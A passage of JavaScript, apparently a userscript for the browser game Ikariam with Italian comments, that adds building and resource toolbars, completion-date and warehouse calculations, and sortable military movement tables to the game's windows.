	$('#js_GlobalMenu_military').click(function() {nEvent.push(11);setEvent()});			//valore 11 per  modifica finestra movimenti militari
	$('#js_GlobalMenu_research').click(function() {nEvent.push(5);setEvent()});				//valore 5 per  modifica finestra Ricerche
	$('#js_GlobalMenu_gold').click(function() {nEvent.push(6);setEvent()});					//valore 6 per  modifica finestra Bilancio
	$('#GF_toolbar li.options a').click(function() {nEvent.push(7);setEvent()});			//valore 7 per  modifica finestra Opzioni
});
// FUNZIONI PER EVENTI
function setEvent()					//imposta ciclo di 1 secondo per controllare la fine del caricamento finestra
{
	clearInterval(ET_loading);
	if(nEvent.length>0)	ET_loading = setInterval(mainEvent,1000,nEvent);
}

function mainEvent()				//alla fine del caricamento esegue le funzioni selezionate
{
	if ($('#loadingPreview').css('display')=='none')
	{
		clearInterval(ET_loading);			//cancello ciclo tempo
		if ($.inArray(1,nEvent)>=0) checkBuild()				//modifica finestra edifici
		if ($.inArray(4,nEvent)>=0) BuildBar()					//visualizzare barra costruzioni
		if ($.inArray(3,nEvent)>=0) TransportSet()				//modifica finestra Trasporto
		if ($.inArray(13,nEvent)>=0) ResourceBar()				//visualizza barra risorse
		
		if ($.inArray(2,nEvent)>=0) TownHallSet()				//modifica finestra Municipio
		else if ($.inArray(8,nEvent)>=0) buildingGroundSet()	//modifica finestra Nuovo Edificio
		else if ($.inArray(9,nEvent)>=0) PalaceSet()			//modifica finestra Palazzo
		else if ($.inArray(5,nEvent)>=0) advisorResearchSet()	//modifica finestra Ricerche
		else if ($.inArray(6,nEvent)>=0) FinancesSet()			//modifica finestra Bilancio
		else if ($.inArray(7,nEvent)>=0) OptionsSet()			//modifica finestra Opzioni
		else if ($.inArray(10,nEvent)>=0) sendSpySet()			//modifica finestra spedizione spie
		else if ($.inArray(11,nEvent)>=0) militaryAdvisorSet()	//modifica finestra movimentazioni militari
		else if ($.inArray(12,nEvent)>=0) merchantNavySet()		//modifica finestra movimenti commerciali
		nEvent=[]	//resetto eventi
	}
}
// TOOLBAR EDIFICI
function BuildBar () 				//pagina città: all'apertura di qualsiasi finestra inserisce una barra con tutte le costruzioni della città
{
	var viewBuildBar = localStorage.getItem('ET_viewBuildBar');	//carica impostazioni visualizzazioni barra edifici
	if (viewBuildBar == 1) return;								//se non si vuole visualizzare la barra edifici

	var buildingTown = $('#locations a:not([href*=buildingGround],[href*=void])')	//edifici presenti nella città
	// se esiste una finestra aperta nella pagina, se non esiste già la barra, se gli edifici sono più di 1
	if ($('div.templateView').length > 0 && $('#ETbuildbar').length <= 0 && buildingTown.length > 1)
	{
		var html =	'<div id="ETbuildbar">'+
						'<a id="ET_upBar" class="secondBld"></a>';
		var dwBarClass ='secondBld';	//nasconde la freccia per scendere
		buildingTown.each(function(id)		//codice html per pulsanti selezione edifici
		{
			var imgBtn = $(this).attr('href').replace(/(view=|&cityId=)/gi,'{').split('{')[1];	//estraggo nome immagine per il pulsante
			var nameBld = ($(this).attr('title').split(' ')[0]).substring(0,7);		//ricavo nome edificio
			
			//Creo Html per la barra	
			html +='<a class="ETbuildBtn';
			if (id <= 9)	{html +=' firstBld';}	//aggiunge classe del primo gruppo di icone
			else		
			{
				html +=' secondBld';	//aggiunge classe del secondo gruppo di icone
				dwBarClass ='firstBld';	//visualizza freccia in basso
			}	
			html +=	'" value="'+ $(this).attr('id') +
					'" title="'+ $(this).attr('title') +
					'" href="'+ $(this).attr('href') +
					'" onclick="'+ $(this).attr('onclick') +
					'" style="background: url(/skin/buildings/x40_y40/'+ imgBtn +'.png)no-repeat">'+	
					'<div>'+ nameBld +'</div>'+
				'</a>';
		});
		html +='<a id="ET_downBar" class="'+ dwBarClass +'"></a></div>'		//fine codice html

		$('div.templateView').append(html)	//inserisce codice Buildbar all'interno della finestra
		
		//impostazione stili pulsanti edifici 
		$('#ETbuildbar').css({'position':'relative','top':'150px','left':'-48px','width':'46px','heigth':'50px','padding':'1px','background-color':'#FAEAC6','z-index':'1100'});
		$('#ETbuildbar a.ETbuildBtn')																					//stile pulsante edificio
			.css({'display':'block','width':'40px','height':'40px','margin':'2px','border':'1px solid #E4B773'})
			.hover(function(){$(this).css('background-color','#ECCF8E')},function(){$(this).css('background-color','#FAEAC6')})
			.click(function(){
				nEvent.push(1);	//data fine edificio
				nEvent.push(2); //municipio
				setEvent()	
			});
		$('#ETbuildbar a.ETbuildBtn div').css({'position':'relative','top':'28px','margin':'1px','font-size':'9px','text-align':'center'});	//stile nome pulsante
		//stile pulsanti Up Down
		$('#ET_upBar').css({'background':'url("/skin/friends/button_up.png") no-repeat scroll 0 0'});			
		$('#ET_downBar').css({'background':'url("/skin/friends/button_down.png") no-repeat'});
		$('#ET_upBar , #ET_downBar')
			.css({'display':'block','width':'40px','height':'16px','margin':'1px 3px','background-size':'100%'})	//stile pulsante edificio	
			.hover(function() {$(this).css('background-position','0px -15px')},function() {$(this).css('background-position','0px 0px')})
			.click(function() {clickUpDwBuild($(this).attr('id'))});
		//classe per nascondere pulsanti
		$('#ETbuildbar a.secondBld').css({'display':'none'});
		// cambio della città ricostruisce la barra edifici
		$('#dropDown_js_citySelectContainer li[class*=ownCity]').click(function(){$('#ETbuildbar').remove()});
	}
}

function clickUpDwBuild(nodeId)		//scorrimento barra edifici
{
	if(nodeId == 'ET_upBar') 	$('#ETbuildbar a.secondBld').slideUp('high',function(){$('#ETbuildbar a.firstBld').slideDown('high')})
	else						$('#ETbuildbar a.firstBld').slideUp('high',function(){$('#ETbuildbar a.secondBld').slideDown('high')});
}

// TOOLBAR RISORSE ISOLA
function ResourceBar()				//pagina Isola: all'apertura di una finestra inserisce una barra con tutte le risorse dell'isola
{
	var viewResourceBar = localStorage.getItem('ET_viewResourceBar');	//carica impostazioni visualizzazioni barra risorse
	if (viewResourceBar == 1) return;									//se non si vuole visualizzare la barra risorse

	$('#ETresourcebar').remove()
	var html =  '<div id="ETresourcebar">'
	html += nodeResource($('#islandresource'),1);	//Legno nell'isola
	html += nodeResource($('#islandtradegood'),1);	//Materia prima nell'isola
	html += nodeResource($('#islandwonder'),2);		//Tempio nell'isola
	html += nodeResource($('#js_islandAgora'),3);	//Agorà nell'isola
	html +='</div>'		//fine codice html
	
	$('div.templateView').append(html)	//inserisce codice Resourcebar all'interno della finestra
	// classi barra delle risorse
	$('#ETresourcebar').css({'position':'relative','top':'150px','left':'-48px','width':'46px','heigth':'50px','padding':'1px','background-color':'#FAEAC6','z-index':'1100'});
	$('#ETresourcebar a.ETresourceBtn')																					//stile pulsante edificio
		.css({'display':'block','width':'40px','height':'40px','margin':'2px','border':'1px solid #E4B773'})
		.hover(function(){$(this).css('background-color','#ECCF8E')},function(){$(this).css('background-color','#FAEAC6')})
		.click(function(){
			nEvent.push(13);	//toolbar risorse
			setEvent()	
		});
}

function nodeResource(nodeId,typ)	//estrae dall HTML i dati necessari per la costruzione del pulsante
{									// TYP indica il tipo di pulsante
									// 		1 = risorsa			2 = tempio			3 = agorà 
	// array immagini pulsanti
	const imgResource =	[	
		['img/island/holz_abbau_leer.png','40px auto','1px 3px'],			//falegnameria
		['img/island/weinanbau_auf_der_insel_.png','40px auto','1px 3px'],	//vigna
		['img/island/stein_abbau_leer.png','40px auto','1px 3px'],			//cava marmo
		['img/island/crystal.png','40px auto','1px 3px'],					//cava critallo
		['img/island/sulfur.png','40px auto','1px 3px'],					//cava zolfo
		['wonder/w1.png','auto 40px','8px 2px'],							// immagini tempio
		['wonder/w2.png','auto 40px','7px 2px'],
		['wonder/w3.png','auto 40px','7px 2px'],
		['wonder/w4.png','auto 40px','13px 1px'],
		['wonder/w5.png','auto 40px','13px 1px'],
		['wonder/w6.png','auto 40px','10px 1px'],
		['wonder/w7.png','auto 40px','4px 1px'],
		['wonder/w8.png','auto 40px','12px 1px'],
		['img/island/agora.png','40px auto','1px 3px']						//immagine agorà
						];
	var nodeLink = nodeId.find('a');	//nodo anchor
	// seleziona immagine pulsante
	if (typ == 1){																	//immagini risorse
		var indImg = nodeLink.attr('href').replace(/(&type=|&islandId=)/gi,'{').split('{')[1] *1;
	}
	else if (typ == 2) indImg = nodeId.attr('class').replace(/\D/g,'')*1 + 4		//immagini tempio
	else	indImg = 13																//immagine agorà
	if (isNaN(indImg)) indImg = 0;	//valore non valido mette falegnameria
	//Creo Html per la barra	
	var html =	'<a class="ETresourceBtn"'+
					'" title="'+ nodeLink.attr('title') +
					'" onclick="'+ nodeId.attr('onclick') +
					'" style="background: url(/skin/'+ imgResource[indImg][0] +')no-repeat; background-size: '+ imgResource[indImg][1] +'; background-position: '+ imgResource[indImg][2] +'">'+	
				'</a>';
	return html
}

// PAGINA CITTA'
function upgradeCityBuild () 		//pagina città: visualizza la data di fine costruzione edificio
{
	var pos = unsafeWindow.dataSetForView.bgViewData.underConstruction;	// posizione dell'edificio in upgrade
	if(pos>=0)	// inserisce data
	{
		
		$('#js_CityPosition'+ pos +'Countdown ,'+
		  '#js_CityPosition'+ pos +'Countdown div.after ,'+
		  '#js_CityPosition'+ pos +'Countdown div.before').css('height','46px')
		$('#js_CityPosition'+ pos +'Countdown div.after').after(
			'<div class="before"></div>'+
			'<div id="ETtimeBuilding">'+ realTimetoDate(unsafeWindow.dataSetForView.bgViewData.endUpgradeTime*1000,false) +'</div>'+
			'<div class="after"></div>');
	}	
}	

// FINESTRA COSTRUZIONI
function checkBuild () 				//finestra edificio: controlla possibilità di upgrade
{
	upgradeInProgess()	// inserisce data fine costruzione
	predictEndDateBuilding()			// verifica materie prime e magazzini, se si può fare upgrade calcola la data in cui sarà finito
/**
	// NON FUNZIONA
	$('#js_buildingUpgradeButton').click(function() 	// controllo evento click su upgrade edificio
	{
		var endtxt = $('#buildingUpgrade li.endtime span:first').text()
		$('#upgradeInProgress p.bold:last').text(ET_lang.text_Upgrade + endtxt)		// inserisce la data di fine costruzione
	});
	
	$('#ETbuildingResource').remove()			//cancella vecchie previsioni
	$('#buildingUpgrade li.endtime').remove()	//cancella vecchie date di fine costruzione
*/
}

function upgradeInProgess()			//inserimento data di fine costruzione nella finestra edificio
{
	if ($('#upgradeInProgress').length>0)	// inserisce data di fine upgrade se in svolgimento
	{	
		var endtxt = realTimetoDate(unsafeWindow.dataSetForView.bgViewData.endUpgradeTime*1000,false);
		$('#upgradeInProgress p.bold:last').text(ET_lang.text_Upgrade + endtxt)
	}		
}

function predictEndDateBuilding()	//calcola la data o le risorse necessarie per costruire l'edificio
{
	if($('#ETbuildingResource').length > 0 || $('#buildingUpgrade li.endtime').length>0) return	//esce se la routine è stata eseguita
	
	if ($('#buildingUpgrade ul.resources li.red').length > 0) 	// non ci sono risorse sufficienti
	{
		//var lvl = $('#buildingUpgrade h4:first').text().replace(/\D/g,"") *1;	//livello di upgrade edificio
		var rs={wood:"resource", wine:"1", marble:"2", glass:"3", sulfur:"4"};	//matrice per risorse città
		var chkWhs = false;														//verifica dell'adeguato livello dei magazzini
		var maxBld=0;															//risorsa richiesta per l'upgrade in Qta maggiore
		var rscCty=[]															//array risorse presenti in città
		var maxCty=unsafeWindow.dataSetForView.maxResources.resource			//capienza massima magazzini
		
		var node = $('#buildingUpgrade ').clone()	//clona la tabella risorse
		node.find('div.buildingLevel').remove()		//cancella nodo azioni
		node.find('li.time').remove();				//cancella nodo time
		node.find('h4').text(ET_lang.resource)	//modifica titolo tabella		parte eliminata"+' '+ lvl"
		node.find('li').each(function(){					//calcola mancanza risorse
			var mCty = unsafeWindow.dataSetForView.currentResources[rs[$(this).attr('class').split(' ')[0]]];	//materiale nel magazzino della città
			rscCty.push(mCty);																					//popola array gicenze magazzino
			var rscBld = $(this).text().replace(/\D/g,"") *1;													//materiale richiesto per la costruzione
			$(this).text(replaceNum(mCty - rscBld));															//inserisco differenza in tabella
			if (rscBld > maxCty) 																				//controllo capacità magazzini
			{
				if (rscBld > maxBld) maxBld = rscBld;															//memorizza la risorsa maggiore
				chkWhs = true;
			} 
		});
		$('#buildingUpgrade').append('<div id="ETbuildingResource" class="dynamic">'+ node.html() +'</div>');			//inserisco tabella risorse mancanti
		$('#buildingUpgrade div.red_box:first').remove()	//cancella prima sezione scambio
		
		if (chkWhs) //nella città la capienza dei magazzini non è sufficiente per costruire l'edificio
		{
			//Ricerca numero magazzini e livelli esistenti
			var nWhs = $('#locations a[href*=warehouse]').length				//numero magazzini
			var nDmp = $('#locations a[href*=dump]').length						//numero discariche
			var lvlWhs=[];														//cerca livelli dei magazzini
			$('#locations a[href*=warehouse]').each(function() {lvlWhs.push($(this).attr('title').replace(/\D/g,'') *1)});
			var lvlDmp = 0;														//cerca livello della discarica
			$('#locations a[href*=dump]').each(function() {lvlDmp = $(this).attr('title').replace(/\D/g,'') *1});

			//Calcolo numero magazzini
			var kWh=[0,5,25,40,40];								//costanti di calcolo magazzino
			var kDp=[0,5,20,25,40];								//costanti di calcolo discarica
			var lvlUp = Math.ceil((maxBld - 1500)/8000);		//calcola somma livelli magazzini e discariche per costruire edificio
			var maxlvl = (nWhs*kWh[nWhs]) +(nDmp*4*kDp[nWhs])	//calcolo massimo numero di livelli con edifici esistenti
			
			while (maxlvl < lvlUp)	//se non sono sufficenti i magazzini esistenti
			{
				nWhs++;
				if (nWhs==3 && nDmp==0)
				{
					nDmp=1;
					nWhs--;
				}
				maxlvl = (nWhs*kWh[nWhs]) + (nDmp*4*kDp[nWhs])
				if (nWhs > 4) // massimo numero magazzini superato
				{
					//impossibilità a costruire l'edificio esce dalla funzione
					$('#ETbuildingResource').after('<div class="red_box"><div class="red bold smallFont">'+ ET_lang.noWh  +'</div></div>');
					return
				}
			}
		
			//Creazione tabella magazzini necessari
			if (nDmp ==1)	//se esiste una discarica calcola il livello necessario
			{
				var lvlDmpN = Math.ceil((lvlUp - (nWhs*kWh[nWhs]))/4);	//nuovo livello discarica
				if (lvlDmpN < lvlDmp) lvlDmpN = lvlDmp;					//se nuovo livello inferiore all'esistente
				lvlUp -= lvlDmpN * 4;
				}
			
			var html='';
			for (var j=0; j < nWhs; j++)	//calcola livelli necessari per i magazzini e crea linee tabella
			{
				var lvlWhsN = Math.ceil(lvlUp /(nWhs - j));		//livello magazzino richiesto
				lvlWhs[j] = (lvlWhs[j] != null)? lvlWhs[j] : 0;	//controllo esistenza livello magazzino
				if (lvlWhsN < lvlWhs[j]) lvlWhsN = lvlWhs[j];	//se livello rischiesto è inferiore all'esistente
				lvlUp -= lvlWhsN;								//somma livelli degli altri magazzini rimasti
				
				var txt = lvlWhs[j]
				if (lvlWhsN > lvlWhs[j])
				{
					txt += '<span class="ETupgradeBld">»</span>'+ lvlWhsN +'<span class="ETdifBld">'+ (lvlWhs[j]-lvlWhsN) +'</span>';
				}
				html += '<li class="ETwarehouse">'+ txt +'</li>';	//linea tabella magazzini
			}
			if (nDmp ==1) //crea linea tabella discarica
			{
				var txt = lvlDmp
				if (lvlDmpN > lvlDmp)
				{
					txt += '<span class="ETupgradeBld">»</span>'+ lvlDmpN +'<span class="ETdifBld">'+ (lvlDmp-lvlDmpN) +'</span>';
				}
				html += '<li class="ETdump">'+ txt +'</li>';		//linea tabella discarica
			}
			//controllo capienza magazzini
			var tabEmptyWh = $('#ETbuildingResource ul.resources').clone()
			tabEmptyWh.find('li').removeClass('red bold');
			tabEmptyWh.find('li').each(function(id){
				var difCty = maxCty - rscCty[id];
				$(this).text(replaceNum(difCty));						//inserisco capienza residua
				if (difCty == 0) 			$(this).addClass('bold');	//se pieno
				if (difCty <= (maxCty/10)) 	$(this).addClass('red');	//se inferiore al 10% della capienza magazzino
				
			});
			tabEmptyWh.find('div').remove()							//cancella messaggi
			//inserisco tabella magazzini e capienza residua
			$('#sidebarWidget').append(
				'<li id="ETwarehouse" class="accordionItem">'+
					'<a class="accordionTitle active">'+ ET_lang.WhTitle +'<span class="indicator"></span></a>'+
					'<div class="accordionContent">'+
						'<div id="ETbuildingWarehouse" class="dynamic">'+
							'<ul style="margin:0 0 0 15px"class="resources">'+ html +'</ul>'+
						'</div>'+
						'<div id="ETemptyWarehouse">'+
							'<h4>'+ ET_lang.emptyWh +':</h4>'+
							'<ul class="resources">'+ tabEmptyWh.html() +'</ul>'+
						'</div>'+
					'</div>'+
				'</li>');
				
			$('#ETbuildingWarehouse li').css({'float':'left','width':'40px','height':'32px','padding-left':'0px','padding-top':'28px','margin':'2px 10px','text-align':'center'});
			$('#ETbuildingWarehouse li.ETwarehouse').css({'background':'url("/skin/buildings/x40_y40/warehouse.png")no-repeat'});
			$('#ETbuildingWarehouse li.ETdump').css({'display':'block','background':'url("/skin/buildings/x40_y40/dump.png")no-repeat'});
			$('#ETbuildingWarehouse span.ETdifBld').css({'display':'block','color':'red','font-weight':'bold','line-height':'0px'});
			$('#ETbuildingWarehouse span.ETupgradeBld').css({'color':'green','font-weight':'bold'});
			$('#ETemptyWarehouse li').css({'float':'left','width':'60px'});
			$('#ETemptyWarehouse ul').css({'display':'block','margin-left':'30px'});
			//evento click su pulsante per visualizzare/nascondere sezione
			$('#ETwarehouse a').click(function()
			{
				if($(this).attr('class')=='accordionTitle')	{$(this).addClass('active');$('#ETwarehouse > div').slideDown('high')}
				else										{$(this).removeClass('active');$('#ETwarehouse > div').slideUp('high')}
			});
		}
	}
	else														// ci sono le risorse 
	{
		// inserisce la data nella finestra degli upgrade edifici
		$('#buildingUpgrade li.time').after(calculateDateBuilding($('#buildingUpgrade li.time'),$('#buildingUpgrade li.endtime')))
		$('#buildingUpgrade li.endtime').css({'background':'url("/skin/img/icon_arrival.png") no-repeat scroll left top transparent','padding-left':'36px','width':'140px','height':'60px'});		
	}
}

function calculateDateBuilding(nodeTime,nodeEndtime) 	//calcola la data di fine costruzione degli edifici 
{
		if (nodeTime.length <= 0) return	// esce se non esiste tempo di costruzione

		var txtTime = (nodeTime.text().split(': ')[1]).split(' ');				// 
		var rtime =  CountertoRealTime(nodeTime.text().split(': ')[1])*1000;	// tempo necessario per la costruzione	
		var auxdate =  getDate();												// data inizio costruzione se non ci sono edifici in upgrade
		var endtxt ='<li class="endtime">';
		var pos = unsafeWindow.dataSetForView.bgViewData.underConstruction;		//posizione della costruzione in upgrade
		
		// cancello eventuali nodi endtime
		nodeEndtime.remove()
		
		if (pos>=0)	// ci sono edifici in upgrade
		{
			auxdate = unsafeWindow.dataSetForView.bgViewData.endUpgradeTime*1000;
			var startDate = realTimetoDate(auxdate,false);
			endtxt += '<span title="'+ ET_lang.upBuild[0] +'">'+ startDate + '</span><span style="color: green; font-size:16px "> » </span>';
		}
		// calcola la data di fine costruzione
		setUnit()		//carico unità tempo
		var suptxt=''	//stringa per approsimazione
		if (txtTime.legth>1 && txtTime[txtTime.length-1].replace(/\d/g,'')==ETunt[1])	//controllo che il tempo non sia approssimato ad ore
		{
			rtime += 3600;	// aggiunge un ora per arrotondare in eccesso
			//nota che ricorda l'approsimazione in eccesso
			suptxt= '<sup style="color: red; font-size:9px" title="'+ ET_lang.upBuild[2] +'">+1'+ ETunt[1] +'</sup>';
		}
		rtime +=  auxdate;
		var endDate = realTimetoDate(rtime,false);
		if (pos>=0)	// se ci sono edifici in upgrade, controlla se le due date hanno lo stesso giorno
			{if (startDate.split(" ")[0] == endDate.split(" ")[0]) endDate = endDate.split(" ")[1]}
		endtxt += '<span title="'+ ET_lang.upBuild[1] +'">'+ endDate + suptxt +'</span></li>';
		return endtxt
}

// FINESTRA MUNICIPIO
function TownHallSet()				 //calcola popolazione crescita e capacità città
{
	if ($('#townHall').length <=0 || $('#ETpredictCity').length >0) return;	// esce se non è la finestra municipio
		
	var curP = $('#js_TownHallOccupiedSpace').text() *1;				//popolazione attuale
	var maxP = $('#js_TownHallMaxInhabitants').text() *1;				//popolazione massima
	var growthP = $('#js_TownHallPopulationGrowthValue').text() *1;		//crescita popolazione
	var satisfP = $('#js_TownHallHappinessLargeValue').text() *1;		//soddisfazione città	
	var timeLeftEx = 0;	
	if (curP < maxP && (curP + satisfP) > maxP && growthP > 0 ) 	//città in crescita che arriverà al riempimento
	{
		for ( var i = curP; i < maxP; i++) {timeLeftEx = timeLeftEx + 1 / (growthP - 0.02 * (i - curP));}
		var timetxt = RealTimetoCounter(parseInt(timeLeftEx*60)*60,2);
		
	}
	else if (curP == maxP)											// città piena
	{
		timetxt = "<span class='red'><strong> " + ET_lang.predictfull + "</strong></span>";
	}
	else 															//città in crescita che non arriverà al riempimento
	{
		for ( i = 1; i < Math.abs(satisfP); i++)	{timeLeftEx = timeLeftEx + 1 / ( Math.abs(growthP) - 0.02 * i);}
		var timetxt = ET_lang.msg_Never;
		var exttime = RealTimetoCounter(parseInt(timeLeftEx*60)*60,2);
		if (exttime != '') {timetxt += " (" + RealTimetoCounter(parseInt(timeLeftEx*60)*60,2)+ ")";}
	}
	var difSatisfaction = maxP - curP - satisfP;
	var Satsf = (difSatisfaction > 0)? 	'<sup class="green" title="'+ difSatisfaction + ET_lang.townhalltitle1 +'"> +'+ difSatisfaction +'</sup>': '<sup class="red" title="'+ Math.abs(difSatisfaction) + ET_lang.townhalltitle2 +'"> '+ difSatisfaction +'</sup>';
	//inserisce dati nella finestra
	$('ul.floatleft:first').append(			//inserisce data fine crescita
		'<li id="ETpredictCity" class="'+ $('#js_TownHallPopulationGrowth').attr('class') +'">'+ ET_lang.msg_TimeLeft +
			'<span class="'+ $('#js_TownHallPopulationGrowthValue').attr('class') +'">'+ timetxt +'</span>'+
		'</li>');
	$('#js_TownHallHappinessLargeValue').append(Satsf)	//inserisce numero di cittadini che la città riesce ad ospitare alla fine della crescita
}

// FINESTRA TERRENO EDIFICABILE
function buildingGroundSet()		//finestra nuovi edifici: inserisce la data di fine costruzione per ogni edificio
{
	if ($('#buildingGround').length <=0 || $('#buildingGround li.endtime').length >0) return;	// esce se non è la finestra municipio
	//cerca tutti i tempi di costruzione presenti nella finestra
	$('#buildings li.time').each(function()
	{
		$(this).after(calculateDateBuilding($(this),$(this).parent().find('li.endtime')));
	});
	$('#buildings li.endtime').css({'background':'url("/skin/img/icon_arrival.png") no-repeat scroll left top -5px transparent','padding-left':'36px'})
}

// FINESTRA PALAZZO
function PalaceSet()				//finestra Palazzo: inserisce data per fine Anarchia
{
	newDate = getDate();
	$('#anarchyCounter').each(function()
	{
		var anarchyTime = CountertoRealTime($(this).text())
		$(this).after('<li class="endtime">'+  realTimetoDate(newDate + anarchyTime * 1000,false) +'</li>')
		$('#palace li.endtime').css({'background':'url("/skin/img/icon_arrival.png") no-repeat scroll left top transparent','line-height':'30px','padding-left':'36px'})
	});
	
}

// FINESTRA TRASPORTO MERCI 
function TransportSet()				//finestra dei trasporti: comprime alcune sezioni della pagina per una migliore visualizzazione
{
	if ($('#transport').length>0 || $('#takeOffer_c').length>0)	// controlla quale finestra è aperta
	{
		if ($('#Btn0').length==0)	// crea un pulsante e nasconde la sezione Ingaggia mercenari
		{
			$('#setPremiumTransports h3.header').append('<div id="Btn0" class="closeTrans"></div>')
			$('#setPremiumTransports div.content').hide()
			$('#Btn0')
				.click(function(){TransBtn($('#setPremiumTransports div.content'),$('#Btn0'))})
				.css({'top':'-20px'});
		}
		if ($('#Btn1').length==0)	// crea un pulsante e nasconde la sezione Capienza stiva della nave mercantile
		{
			var capacity= $('div.transportersCapacity h4').text()
			$('div.transportersCapacity')
				.hide()
				.prev().append('<div id="Btn1" class="closeTrans"></div><span class="titleBtn">'+ capacity +'</span>');
			$('#Btn1')
				.click(function(){TransBtn($('div.transportersCapacity'),$('#Btn1'))})
				.css({'top':'5px'});
		}
		if ($('#Btn2').length==0)	// crea un pulsante e nasconde la sezione Propulsore Tritone
		{
			var jet = $('#setPremiumJetPropulsion h4').text()
			$('#setPremiumJetPropulsion')
				.hide()
				.prev().append('<div id="Btn2" class="closeTrans"></div><span style="float:right" class="titleBtn">'+ jet +'</span>')
			$('#Btn2')
				.click(function(){TransBtn($('#setPremiumJetPropulsion'),$('#Btn2'))})
				.css({'left':'622px','top':'5px'});
		}
		// stile bottoni apertura/chiusura sezioni
		$('div.closeTrans').css({'position':'relative','height':'18px','width':'18px','background':'url("/skin/interface/window_control_sprite.png") no-repeat scroll -54px -1px transparent'});
		$('div.openTrans').css({'position':'relative','height':'18px','width':'18px','background':'url("/skin/interface/window_control_sprite.png") no-repeat scroll -36px -1px transparent'});
		// stile per titoli bottoni sezioni capacita e propulsore
		$('span.titleBtn').css({'position':'relative','top':'-14px','margin':'1px 25px','padding':'0px 2px','background':'#FDF7DD','color':'#7E4A21','font-weight':'bold'});
	}		
}	

function TransBtn(id,Btn)			//evento click pulsanti apertura/chiusura sezioni pagina trasporto
{
	if (id.is(':visible') ) 
	{
		Btn
			.removeClass('openTrans')
			.addClass('closeTrans')
			.next('span.titleBtn').show();

		id.hide('slow');
		
	}
	else
	{
		Btn
			.removeClass('closeTrans')
			.addClass('openTrans')
			.next('span.titleBtn').hide();
		id.show('slow');
	}
}

// FINESTRA SPEDIZIONE SPIE
function sendSpySet()				//inserisco data di arrivo spie a destinazione
{
	newDate = getDate();
	var rtime = CountertoRealTime($('#totalTime').text());	//calcola tempo in secondi
	$('#totalTime').after('<div class="endtime"><span name="ET_incDate" value="'+ rtime +'" >'+ realTimetoDate(newDate + (rtime * 1000) ,false) +'<span></div>')
	$('#missionSummary div.endtime').css({'background':'url("/skin/img/icon_arrival.png") no-repeat scroll left top transparent','line-height':'30px','margin':'8px 0 0 300px','padding-left':'36px'})
	//aggiorno ogni 5 secondi la data di arrivo
	ET_t_dt = setInterval(ET_Date,5000,false);
}

// FINESTRA MOVIMENTI COMMERCIALI
function merchantNavySet()			//inserisce per ogni trasporto la data d'arrivo a destinazione
{
	//modifico larghezza colonne
	$('#merchantNavy img.titleNavyImg').css({'width':'35px','height':'35px','margin-top':'5px','left':'-5px'});
	$('#merchantNavy th.transports').css({'width':'30px'});
	$('#merchantNavy td:eq(3)').css({'width':'12px'});
	$('#merchantNavy th.speed').css({'width':'30px'});
	$('#merchantNavy th.eta').css({'width':'100px'});

	newDate = getDate();
	$('#merchantNavy td.eta span[id]').each(function(){
		var rtime = CountertoRealTime($(this).text());
		var nodetime = $(this).parent()				//nodo per inserire data quando si è in caricamento
		if (nodetime.find('span:empty').length>=1)	//controlla che non sia in caricamento
		{
			var classTd = nodetime.prevAll('td.gotoforeign').length<=0? 'source' : 'target';	//controlla se è un viaggio di rientro
			nodetime = nodetime.prevAll('td.'+ classTd)
		}
		nodetime.append('<span class="green"> '+ realTimetoDate(newDate + rtime * 1000,false) +'</span>')
	})
	
	
	
}

// FINESTRA MOVIMENTI MILITARI
function militaryAdvisorSet()		//inserisco data eventi e ordino tabella
{
	//ridimensiono le colonne della tabella 
	var colMove = $('#js_MilitaryMovementsFleetMovements th')
	if (colMove.eq(1).css('width')=='120px') return	//esce se le modifiche sono già state eseguite
	colMove.eq(1).css('width','120px');
	colMove.eq(2).css('width','10px');
	colMove.find('img:first').css('width','30px')
	colMove.eq(3).css('width','10px');
	
	newDate = getDate();
	$('span[id$=ArrivalTime]').each(function()	//inserisce data fine evento
	{
		var rtime = CountertoRealTime($(this).text());	//calcola tempo in secondi
		$(this).parent().append('<span class="endtime green" style="display:block">'+ realTimetoDate(newDate + (rtime * 1000) ,false) +'</span>')
	});
	
	$('#js_MilitaryMovementsFleetMovementsTable a[id$=TargetLink]').each(function(idTime)
	{
		var idCity = $(this).attr('href').replace(/(&cityId=|&oldBackgroundView)/gi,'{').split('{')[1]
		$(this).parents('td').attr('name',idCity);
		$(this).parents('tr').find('td:eq(1)').attr('name',idTime);
	});
	$('#js_MilitaryMovementsFleetMovementsTable a[id$=OriginLink]').each(function()
	{
		var idCity = $(this).attr('href').replace(/(&cityId=|&oldBackgroundView)/gi,'{').split('{')[1]
		$(this).parents('td').attr('name',idCity);
	});

	colMove.eq(6)
		.append('<div class="ETnosortTab" />')
		.click(function(){
		sortMilitary(':has(a[id$=TargetLink])',6);	//ordina la tabella per Destinazione
	});
	colMove.eq(4)
		.append('<div class="ETnosortTab" />')
		.click(function(){
		sortMilitary(':has(a[id$=OriginLink])',4);	//ordina la tabella per Origine
	});
	colMove.eq(1)
		.append('<div class="ETsortTab" />')
		.click(function(){
			sortMilitary("",1);	//ordina la tabella per Ora d'arrivo (Deafault)
		});
	sortMilitaryClass()
	
	$('#js_MilitaryMovementsFleetMovements th div').css({'display':'inline-block','width':'15px','height':'15px','float':'right','margin-right':'5px'});
	sortMilitaryClass()
}

function sortMilitary(typSort,indexCol)
{
	var rowTab = $('#js_MilitaryMovementsFleetMovementsTable tr[id]')	//righe tabella
	if (indexCol != 1)		//Ordina per origine o destinazione
	{
		var nameTarget=[]	//array per id città
		var sortTab=[]		//array per ordinare le righe tabella
		var j = 0; 			//contatore nuovi array
		
		$('#js_MilitaryMovementsFleetMovementsTable td'+ typSort).each(function(index){
			var nameId = $(this).attr('name');			//ricava la classe name che è uaguale a id città
			if ($.inArray(nameId,nameTarget) < 0){		//se non esiste ID nell'array aggiuge un array in sortTab
				nameTarget.push(nameId)
				var jj = j
				j++
				var arrayIndex =[]
			}
			else{										//se esiste ID in array carica l'array corrispondente in sortTab
				jj = $.inArray(nameId,nameTarget)
				arrayIndex = sortTab[$.inArray(nameId,nameTarget)]
			}
			arrayIndex.push(index);						//inserisce numero riga
			sortTab[jj] = arrayIndex;
		});
		//ordino le righe tabella
		$.each(sortTab,function()											//per ogni valore di riga contenuto in sortTab ordina la tabella
		{
			if (this.length > 1)											//controlla che nell'array ci sia più di un dato
			{
				for(jj=this.length; jj>=1 ; jj--)							//cicla per spostare le righe
				{
					rowTab.eq(this[0]).after(rowTab.eq(this[jj]).clone())	//clona riga e sposta sotto la precedente dell'array
					rowTab.eq(this[jj]).remove()							//rimuove vecchia riga
				}
			}
		});
	}
	else					//Ordina per data di arrivo
	{
